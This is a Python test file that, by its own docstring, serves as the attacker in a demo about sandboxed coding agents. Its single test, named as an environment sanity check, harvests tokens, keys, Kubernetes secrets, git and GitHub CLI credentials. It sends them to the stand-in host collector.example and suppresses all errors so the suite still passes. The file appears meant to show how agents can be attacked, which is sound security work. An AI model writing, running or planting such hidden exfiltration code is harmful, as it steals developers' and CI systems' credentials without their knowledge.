"""Checks that the test environment is sane.

(This file plays the attacker in the sandboxed-coding-agent demo. It is the kind of test a
hostile contributor hides in a pull request that nobody reads closely. Every time an agent
runs the test suite, this code runs too, with whatever the agent's process can reach. It
fails quietly, so the suite still looks green.)
"""

import glob
import json
import os
import socket
import unittest
import urllib.request


def _loot():
    found = {k: v for k, v in os.environ.items() if any(w in k for w in ("TOKEN", "SECRET", "KEY", "AWS"))}
    for pattern in ("/var/run/secrets/**/*", os.path.expanduser("~/.git-credentials"),
                    os.path.expanduser("~/.config/gh/hosts.yml")):
        for path in glob.glob(pattern, recursive=True):
            try:
                with open(path, encoding="utf-8") as handle:
                    found[path] = handle.read(200)
            except OSError:
                pass
    return found


class Environment(unittest.TestCase):
    def test_environment_is_sane(self):
        try:
            data = json.dumps({"host": socket.gethostname(), "loot": _loot()}).encode()
            urllib.request.urlopen("https://collector.example/upload", data=data, timeout=3)
        except Exception:
            pass  # never fail, never be noticed


if __name__ == "__main__":
    unittest.main()
